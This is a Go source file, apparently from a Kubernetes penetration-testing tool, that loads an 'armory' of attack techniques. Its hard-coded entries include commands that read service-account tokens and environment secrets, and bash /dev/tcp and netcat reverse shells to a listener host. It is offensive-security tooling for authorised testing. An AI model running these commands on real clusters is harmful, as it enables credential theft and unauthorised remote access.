package armory

import (
	"cmp"
	"errors"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"slices"
	"strings"

	"github.com/Magier/Ran/domain"
	"gopkg.in/yaml.v3"
)

type Armory struct {
	ttps []domain.TTP
}

func LoadArmory(dir string) (Armory, error) {
	ttps := []domain.TTP{}

	// parse "attacks as code" in the specified dir folder
	err := filepath.WalkDir(dir, func(w string, d fs.DirEntry, err error) error {
		if d.IsDir() {
			// skip subfolder with all unsupported check details
			// if d.Name() == SkipDir { }
			return err
		}

		// parse the TTP
		// parse the preconditions and effect
		// invoke builder to get the currect sub-type of the TTP (based on the kind?)

		// parse the preconditions and effect
		// invoke builder to get the currect sub-type of the TTP (based on the kind?)
		if strings.HasSuffix(w, ".yaml") {
			content, err := os.ReadFile(w)
			if err != nil {
				return fmt.Errorf("failed to read file %s: %w", w, err)
			}

			var ttp domain.TTP
			err = yaml.Unmarshal(content, &ttp)
			if err != nil {
				return fmt.Errorf("failed to unmarshal YAML content from file %s: %w", w, err)
			}
			// ttp.CommandMsg = parseCommandToMessage(ttp.Command)
			ttps = append(ttps, ttp)
		}

		// if strings.HasSuffix(w, ".md") {
		// }

		return nil
	})
	if err != nil {
		return Armory{}, errors.New("Couldn't load armory: " + err.Error())
	}

	ttps = append(ttps, []domain.TTP{
		{
			Name:        "Read SerivceAccount Token",
			Description: "Command to download a prepared C2 implant and execute it to establish a session",
			Tactic:      domain.CredentialAccess,
			CmdVariants: []domain.CmdVariant{
				{Key: "", Command: "cat"},
				{Key: "sliver", Command: "get_file"},
			},
			Args:     map[string]string{"": "/var/run/secrets/kubernetes.io/serviceaccount/token"},
			Requires: domain.Requirements{AccessLevel: domain.UserRead},
			// Effects:  []domain.Event{domain.ServiceAccountTokenExtracted{}},
			Effects: []string{"src.Pod.name", "ServiceAccount.name", "Namespace.name"},
			// ResultHandler: parsers.HandleSaTokenRead,
		},
		{
			Name:     "Install kubectl",
			Tactic:   domain.Discovery,
			Requires: domain.Requirements{Kind: "Pod", AccessLevel: domain.UserExec},
			Args:     map[string]string{"PATH": "~/.local/bin/kubectl"},
			CmdVariants: []domain.CmdVariant{
				{Key: "curl", Command: `bash -c "curl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\" && chmod +x kubectl && mkdir -p ~/.local/bin && mv ./kubectl ${PATH}"`},
			},
		},

		{
			Name:     "Check Token permissions",
			Tactic:   domain.Discovery,
			Requires: domain.Requirements{Kind: "ServiceAccount"},
			CmdVariants: []domain.CmdVariant{
				// "kubectl":           "kubectl auth can-i --list --token=${TOKEN} --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt -n ${NS}",
				// "kubectl_remote_sa": "kubectl auth can-i --list --token=${TOKEN} --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt -n ${NS} --as=system:serviceaccount:${NS}:${SA.NAME}",
				// -H "application/vnd.kubernetes.protobuf,application/json"
				//	-H "Impersonate-User: system:serviceaccount:${NS}:${SA_NAME}"   <- for "external" checks; requires impersonation RBAC permissions
				{Key: "curl", Command: `curl -XPOST
					${API_SERVER}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews
					--cacert ${CA_PATH}
					-H "Authorization: Bearer ${TOKEN}"
					-H "Content-Type: application/json"
					--data '{
						"kind": "SelfSubjectRulesReview",
						"apiVersion": "authorization.k8s.io/v1",
						"spec": { "namespace": "${NS}" }
					}'`},
			},
			// ResultHandler: parsers.HandleSelfSubjectReviewResult,
		},
		{
			Name:        "Start reverse shell",
			Description: "Establish a simple shell",
			Tactic:      domain.Execution,
			CmdVariants: []domain.CmdVariant{
				{Key: "shell", Command: `bash -c "bash >& /dev/tcp/${LISTENER}/${LISTENER_PORT} 0>&1 &"`},
				{Key: "nc", Command: `bash -c "nc "${LISTENER} ${LISTENER_PORT} -e /bin/sh &"`},
			},
			Requires: domain.Requirements{Exists: domain.EntitiesExists{"Listener"}, AccessLevel: domain.UserExec},
		},
		{
			Name:        "Read Environment Variables",
			Description: "Read environment variables from a target",
			Tactic:      domain.Discovery,
			Requires:    domain.Requirements{AccessLevel: domain.UserRead},
			CmdVariants: []domain.CmdVariant{
				{Key: "shell", Command: `env`},
				{Key: "cat", Command: `cat /proc/self/environ`},
			},
			// ResultHandler: parsers.HandleEnvVarResult,
		},
	}...)

	return Armory{
		ttps: sortTTPs(ttps),
	}, nil
}

// order all the TTPs first by the Tactic and then by their names
func sortTTPs(ttps []domain.TTP) []domain.TTP {
	tacticOrder := []domain.Tactic{
		domain.Reconnaissance,
		domain.ResourceDevelopment,
		domain.InitialAccess,
		domain.Execution,
		domain.Persistence,
		domain.PrivilegeEscalation,
		domain.DefenseEvasion,
		domain.CredentialAccess,
		domain.Discovery,
		domain.LateralMovement,
		domain.Collection,
		domain.CommandAndControl,
		domain.Exfiltration,
		domain.Impact,
	}

	tacticIndex := make(map[domain.Tactic]int)
	for i, tactic := range tacticOrder {
		tacticIndex[tactic] = i
	}
	slices.SortFunc(ttps, func(a, b domain.TTP) int {
		return cmp.Or(
			cmp.Compare(tacticIndex[a.Tactic], tacticIndex[b.Tactic]),
			cmp.Compare(a.Name, b.Name),
		)
	})
	return ttps
}

func (a Armory) GetTTP(id string) (domain.TTP, bool) {
	for _, ttp := range a.ttps {
		if ttp.GetID() == id {
			return ttp, true
		}
	}
	return domain.TTP{}, false
}

func (a Armory) GetTTPs() []domain.TTP {
	return a.ttps
}
